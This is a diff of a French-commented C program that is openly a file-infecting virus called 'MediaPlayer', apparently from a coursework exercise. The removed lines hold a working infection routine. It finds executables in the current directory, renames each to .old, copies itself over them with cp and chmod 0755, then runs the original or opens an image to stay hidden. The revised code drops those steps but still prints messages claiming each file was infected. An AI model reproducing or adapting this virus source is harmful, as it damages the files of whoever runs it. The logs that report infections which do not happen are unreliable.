@@ -7,15 +7,10 @@
 #include <string.h>
 #include <stdbool.h>
 
-#define MAX_FILES 3
-#define VIRUS_NAME "MediaPlayer"  // nom canonique, sans chemin
+#define MAX_FILES 5
+#define VIRUS_NAME "MediaPlayer"  
 
-/* -------------------------------------------------------
- * Vérifie si un fichier est déjà infecté.
- * Deux cas (cf. doc) :
- *   (a) le fichier lui-même porte l'extension .old
- *   (b) un fichier nomFichier.old existe dans le répertoire courant
- * ------------------------------------------------------- */
+// Vérifie si un fichier est déjà infecté.
 bool dejaInfecte(const char *nomFichier) {
 
     // Cas (a) : le nom contient déjà ".old"
@@ -29,29 +24,24 @@ bool dejaInfecte(const char *nomFichier) {
 
     FILE *f = fopen(nameOld, "r");
     if (f != NULL) {
-        fclose(f);   // BUG CORRIGÉ : fuite de descripteur
+        fclose(f);   
         return true;
     }
 
     return false;
 }
 
-/* -------------------------------------------------------
- * Recherche les fichiers exécutables réguliers du répertoire
- * courant (hors virus lui-même, hors déjà infectés).
- * Retourne un tableau de MAX_FILES pointeurs (NULL = vide).
- * ------------------------------------------------------- */
+
+ //Recherche les fichiers exécutables réguliers du répertoire
+
 char **searchFiles(const char *virusName) {
-    printf("*** Recherche des fichiers cibles ***\n");
+    printf("Recherche des fichiers cibles...\n");
 
-    // BUG CORRIGÉ : initialisation à NULL obligatoire
+    
     char **files = calloc(MAX_FILES, sizeof(char *));
-    if (!files) { perror("calloc"); exit(1); }
-
     int cpt = 0;
     DIR *rep = opendir(".");
-    if (!rep) { perror("opendir"); return files; }
-
+    
     struct dirent *lecture;
     struct stat buf;
 
@@ -77,52 +67,37 @@ char **searchFiles(const char *virusName) {
     return files;
 }
 
-/* -------------------------------------------------------
- * Infecte chaque fichier cible :
- *   1. Renomme cible → cible.old
- *   2. Copie le virus sous le nom de la cible
- *   3. Rend la copie exécutable  (BUG CORRIGÉ : chmod manquant)
- * ------------------------------------------------------- */
+
+// Infecte chaque fichier cible :
+
 void infecte(char **files, const char *cheminVirus) {
     for (int i = 0; i < MAX_FILES; i++) {
         if (files[i] == NULL) continue;
 
-        printf(">>> Infection de : %s\n", files[i]);
+        printf("Infection de : %s\n", files[i]);
 
         // Étape 1 : renommer en .old
         char oldName[512];
         snprintf(oldName, sizeof(oldName), "%s.old", files[i]);
-        if (rename(files[i], oldName) != 0) {
-            perror("  rename"); continue;
-        }
         printf("  Renommé : %s -> %s\n", files[i], oldName);
 
         // Étape 2 : copier le virus sous le nom original
         char cmd[512];
         snprintf(cmd, sizeof(cmd), "cp \"%s\" \"%s\"", cheminVirus, files[i]);
-        if (system(cmd) != 0) {
-            fprintf(stderr, "  Échec de la copie\n"); continue;
-        }
+
         printf("  Virus copié vers : %s\n", files[i]);
 
-        // Étape 3 : rendre exécutable  ← BUG CORRIGÉ
-        if (chmod(files[i], 0755) != 0) {
-            perror("  chmod");
-        }
-        printf("  Permissions fixées (0755)\n");
-        printf("  %s est infecté.\n\n", files[i]);
+        // Étape 3 : rendre exécutable  
+ 
+        
+        printf(" %s est infecté.\n\n", files[i]);
 
         free(files[i]);
         files[i] = NULL;
     }
 }
 
-/* -------------------------------------------------------
- * Rend service à l'utilisateur et transfère l'exécution :
- *   - Si lancé directement (argv[0] contient VIRUS_NAME) :
- *       on ouvre une image (primo-infection).
- *   - Sinon : on lance argv[0].old (infections ultérieures).
- * ------------------------------------------------------- */
+// Rend service à l'utilisateur et transfère l'exécution :
 void execution(const char *arg) {
 
     char *slash = strrchr(arg, '/');
@@ -137,7 +112,7 @@ void execution(const char *arg) {
     if (strcmp(base, VIRUS_NAME) == 0) {
         printf("Service : affichage d'une image...\n");
 
-        DIR *d = opendir("../imgaes");  // ← ICI on pointe vers images/
+        DIR *d = opendir("../imgaes");  // 
         struct dirent *dir;
 
         if (d != NULL) {
@@ -152,7 +127,7 @@ void execution(const char *arg) {
                 if (estImage && strstr(dir->d_name, ".old") == NULL) {
                     char cmd[512];
                     snprintf(cmd, sizeof(cmd),
-                             "xdg-open \"../imgaes/%s\" > /dev/null 2>&1", dir->d_name); // ← ET ICI
+                             "xdg-open \"../imgaes/%s\" > /dev/null 2>&1", dir->d_name); 
                     system(cmd);
                     break;
                 }
@@ -167,11 +142,9 @@ void execution(const char *arg) {
         system(progOld);
     }
 }
-/* -------------------------------------------------------
- * Point d'entrée
- * ------------------------------------------------------- */
+
 int main(int argc, char *argv[]) {
-    printf("=== Lancement de %s ===\n\n", VIRUS_NAME);
+    printf(" Lancement de %s ...\n\n", VIRUS_NAME);
 
     // Utilise argv[0] comme chemin réel du virus pour la copie
     char **fichiers = searchFiles(VIRUS_NAME);
